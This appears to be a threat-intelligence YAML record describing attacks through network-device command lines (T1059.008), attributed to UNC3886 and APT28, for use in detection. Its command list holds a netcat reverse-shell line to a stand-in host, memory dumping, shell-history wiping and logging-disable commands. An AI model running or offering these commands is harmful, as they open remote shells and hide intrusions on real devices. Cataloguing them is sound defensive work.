@@ -1,0 +1,77 @@
+description: Adversaries use network device CLI to execute malicious commands, alter
+  configurations, disable security controls, and establish persistence.
+attribution: UNC3886, APT28
+malware_families:
+- TINYSHELL
+- Line Dancer
+- Jaguar Tooth
+TTPs:
+  processes:
+  - cat
+  - mkfifo
+  - dd
+  - history
+  - show configuration
+  - write mem
+  - logging disable
+  - capture
+  - copy
+  - show running-config
+  - show version
+  - show ip interface brief
+  - show arp
+  - show cdp neighbors
+  - show start
+  - show ip route
+  - show flash
+  commandline:
+  - cat /dev/zero | dd of=/proc/self/mem bs=1 seek=$((0xdeadbeef)) count=4
+  - mkfifo /tmp/f; cat /tmp/f | nc attacker.com 80 &
+  - dd if=/proc/self/mem of=/tmp/mem_dump
+  - export HISTFILE='
+  - unset HISTFILE
+  - history -c
+  - rm -f $HOME/.sh_history
+  - show configuration
+  - write mem
+  - logging disable
+  - capture capture_name interface inside match ip any any
+  - copy /pcap disk0:/capture_name.pcap
+  - show running-config
+  - show version
+  - show ip interface brief
+  - show arp
+  - show cdp neighbors
+  - show start
+  - show ip route
+  - show flash
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity:
+  - /tmp/f
+  - /proc/self/mem
+  - /tmp/mem_dump
+  - $HOME/.sh_history
+  - /pcap disk0:/capture_name.pcap
+  persistence:
+  - Service Policy Lock
+  - write mem
+  - logging disable
+  - capture capture_name interface inside match ip any any
+  - copy /pcap disk0:/capture_name.pcap
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls:
+  - https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-targets-juniper-routers
+  - https://www.bleepingcomputer.com/news/security/us-uk-warn-of-govt-hackers-using-custom-malware-on-cisco-routers/
+authors:
+- Sıla Özeren Hacıoğlu
+reference: https://www.picussecurity.com/resource/blog/t1059-008-network-device-cli
+date_of_publication: March 14, 2026
+file_creation_date: March 14, 2026
